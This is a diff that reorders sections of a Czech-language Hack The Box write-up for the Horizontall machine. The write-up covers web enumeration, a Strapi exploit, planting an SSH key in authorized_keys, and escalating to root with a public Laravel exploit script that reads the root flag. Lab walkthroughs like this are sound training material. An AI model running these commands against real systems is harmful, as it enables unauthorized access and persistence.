@@ -9,6 +9,7 @@ tags: linux ssh php exploit enumeration privesc
 ## Úvod a kontext
 
 Horizontall je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.
+
 ## Počáteční průzkum
 
 ### Vyhledání otevřených portů
@@ -39,6 +40,16 @@ V dalším kroku si zpřesňuji verze služeb a jejich charakteristiky, protože
 |_http-title: Did not follow redirect to http://horizontall.htb
 ```
 
+### Enumerace webu
+
+Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
+```bash
+./dirsearch/dirsearch.py -u http://$IP -e php -x 403 -r
+```
+```
+=> http://api-prod.horizontall.htb/admin/
+```
+
 ## Analýza zjištění
 
 ### Identifikace a hledání exploitu
@@ -51,16 +62,11 @@ whatweb -v http://api-prod.horizontall.htb
 => Strapi <strapi.io> (from x-powered-by string)
 ```
 
-## Počáteční průzkum
+### Identifikace a hledání exploitu (2)
 
-### Enumerace webu
-
-Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
+Zjišťuji technologii a ověřuji známé zranitelnosti.
 ```bash
-./dirsearch/dirsearch.py -u http://$IP -e php -x 403 -r
-```
-```
-=> http://api-prod.horizontall.htb/admin/
+searchsploit laravel
 ```
 
 ## Získání přístupu
@@ -74,29 +80,6 @@ python3 Strapi.py http://api-prod.horizontall.htb
 ```
 mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo "ssh-rsa __CENSORED__= hack@kali" >> ~/.ssh/authorized_keys && echo ssh-rsa __CENSORED__= hack@kali >> ~/.ssh/authorized_keys
 ```
-
-## Analýza zjištění
-
-### Identifikace a hledání exploitu (2)
-
-Zjišťuji technologii a ověřuji známé zranitelnosti.
-```bash
-searchsploit laravel
-```
-
-## Eskalace oprávnění
-
-### Získání root flagu
-
-Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
-```bash
-python3 /usr/share/exploitdb/exploits/php/webapps/49424.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log "cat /root/root.txt"
-```
-```
-__CENSORED__
-```
-
-## Získání přístupu
 
 ### Získání user flagu
 
@@ -118,6 +101,18 @@ tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      
 tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
 tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
 tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+```
+
+## Eskalace oprávnění
+
+### Získání root flagu
+
+Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
+```bash
+python3 /usr/share/exploitdb/exploits/php/webapps/49424.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log "cat /root/root.txt"
+```
+```
+__CENSORED__
 ```
 
 ## Shrnutí klíčových poznatků
